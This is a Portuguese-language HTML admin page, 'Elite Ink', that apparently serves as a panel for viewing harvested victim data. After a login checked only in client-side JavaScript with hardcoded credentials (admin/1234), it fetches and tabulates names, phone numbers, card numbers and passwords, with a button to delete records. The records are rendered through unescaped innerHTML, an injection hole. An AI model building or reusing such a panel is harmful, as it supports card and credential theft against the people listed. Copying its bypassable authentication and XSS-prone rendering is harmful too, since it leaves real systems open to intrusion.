<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Área Restrita - Elite Ink</title>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .login-box { background: #161b22; padding: 20px; border-radius: 10px; border: 1px solid #30363d; width: 300px; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; cursor: pointer; border-radius: 5px; border: none; font-weight: bold; }
        .btn-verde { background: #238636; color: white; }
        .btn-apagar { background: #da3633; color: white; padding: 5px 10px; border-radius: 4px; font-size: 12px; }
        table { width: 100%; max-width: 900px; border-collapse: collapse; margin-top: 20px; display: none; } /* Escondida até logar */
        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; background: #161b22; }
        th { background: #21262d; color: #58a6ff; }
    </style>
</head>
<body>

    <div class="login-box" id="caixaLogin">
        <h2>🔐 Área Restrita</h2>
        <input type="text" id="user" placeholder="Usuário">
        <input type="password" id="pass" placeholder="Senha">
        <button class="btn-verde" onclick="entrar()">DESBLOQUEAR ACESSO</button>
    </div>

    <table id="tabelaDados">
        <thead>
            <tr>
                <th>Nome</th>
                <th>Telefone</th>
                <th>Cartão</th>
                <th>Senha</th>
                <th>Ação</th>
            </tr>
        </thead>
        <tbody id="corpoTabela"></tbody>
    </table>

    <script>
        // CONFIGURAÇÃO DE ACESSO
        const USUARIO_DB = "admin"; 
        const SENHA_DB = "1234";

        async function entrar() {
            const u = document.getElementById('user').value;
            const s = document.getElementById('pass').value;

            if(u === USUARIO_DB && s === SENHA_DB) {
                document.getElementById('caixaLogin').style.display = 'none';
                document.getElementById('tabelaDados').style.display = 'table';
                await carregarDados();
            } else {
                alert("Acesso negado, Mateus! Verifique login e senha.");
            }
        }

        async function carregarDados() {
            const res = await fetch('/ver-dados-restritos');
            const dados = await res.json();
            const tabela = document.getElementById('corpoTabela');
            tabela.innerHTML = '';

            dados.forEach(item => {
                tabela.innerHTML += `
                    <tr>
                        <td>${item.nome || '---'}</td>
                        <td>${item.telefone || '---'}</td>
                        <td>${item.cartao || '---'}</td>
                        <td>${item.senha || '---'}</td>
                        <td>
                            <button class="btn-apagar" onclick="deletar('${item._id}')">🗑️ Apagar</button>
                        </td>
                    </tr>
                `;
            });
        }

        async function deletar(id) {
            if(confirm('Deseja excluir permanentemente este registro?')) {
                const res = await fetch(`/excluir/${id}`, { method: 'DELETE' });
                if(res.ok) {
                    alert('Registro removido com sucesso!');
                    carregarDados(); // Recarrega a lista
                }
            }
        }
    </script>
</body>
</html>
